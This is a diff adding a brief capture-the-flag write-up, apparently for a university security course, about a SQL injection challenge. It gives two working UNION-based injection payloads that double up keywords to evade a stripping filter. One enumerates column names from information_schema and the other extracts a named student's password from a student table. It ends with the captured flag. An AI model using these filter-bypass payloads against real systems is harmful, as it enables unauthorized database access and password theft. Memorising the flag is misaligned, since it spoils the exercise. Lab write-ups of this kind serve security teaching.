@@ -1,0 +1,8 @@
+First i needed to find which column stored the password which i found out using information.schema.
+Once i found out the column was password i just had to use my username in order to get my pass.
+
+Query to get column name: ' oorr '1' = '1' uniunionon selselectect 1,column_name,3,4,5,6,7,8,9,10,11,12,13,14 from infoorrmation_schema.columns #
+
+Query to find the password: ' oorr '1' = '1' uniunionon selselectect 1,passwoorrd,3,4,5,6,7,8,9,10,11,12,13,14 from student whwhereere name='ASHIT RAI' #
+
+FLAG: cs628{eb512d43241fd14310fa24a4dbf51355}
